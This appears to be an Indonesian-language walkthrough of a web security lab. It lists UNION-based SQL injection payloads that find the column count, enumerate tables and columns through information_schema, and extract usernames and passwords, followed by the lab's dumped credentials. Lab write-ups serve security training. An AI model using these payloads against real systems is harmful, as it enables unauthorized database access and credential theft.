1.Mendapatkan Daftar Tabel
' UNION SELECT table_name, NULL FROM information_schema.tables--
Hasil: Ditemukan tabel users_mrnzcz

2. Mendapatkan Daftar Kolom
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_mrnzcz'--
Hasil: Ditemukan kolom username_ukyfky dan password_fnvhfs

3.Mengekstrak Data User
' UNION SELECT username_ukyfky, password_fnvhfs FROM users_mrnzcz--
Hasil:username: administrator. carlos. wiener
password: 8mftibk72evbl7pjak6l. fm6w6hxxzno9k71s7460. 0aaxyy4g7clms3sdgcpq

Tools yang Digunakan

    Burp Suite Community Edition

    Browser (Chromium)

    ```sql
-- Menentukan jumlah kolom
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Mendapatkan daftar tabel
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Mendapatkan daftar kolom
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_mrnzcz'--

-- Mengekstrak data user
' UNION SELECT username_ukyfky, password_fnvhfs FROM users_mrnzcz-- 